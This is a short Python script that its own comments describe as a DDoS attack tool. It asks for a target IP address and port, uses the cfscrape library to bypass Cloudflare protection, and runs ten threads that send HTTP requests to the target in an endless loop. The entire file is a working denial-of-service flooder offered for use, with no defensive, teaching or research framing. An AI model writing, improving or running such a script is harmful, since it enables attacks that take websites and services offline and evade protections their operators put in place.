import cfscrape
import requests
import threading

# Function to send HTTP requests using Cloudflare bypass
def send_request(target_url):
    scraper = cfscrape.create_scraper()
    while True:
        try:
            response = scraper.get(target_url)
            print(f"Sent request to {target_url} - Status Code: {response.status_code}")
        except Exception as e:
            print(f"Error sending request: {e}")

# Get user input for target IP address and port number
target_ip = input("Enter the target IP address: ")
target_port = input("Enter the target port number: ")

# Construct the target URL
target_url = f"http://{target_ip}:{target_port}"

# Number of threads to use for the DDoS attack
num_threads = 10

# Create threads to send multiple requests simultaneously
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=send_request, args=(target_url,))
    thread.daemon = True
    threads.append(thread)

# Start the threads
for thread in threads:
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()
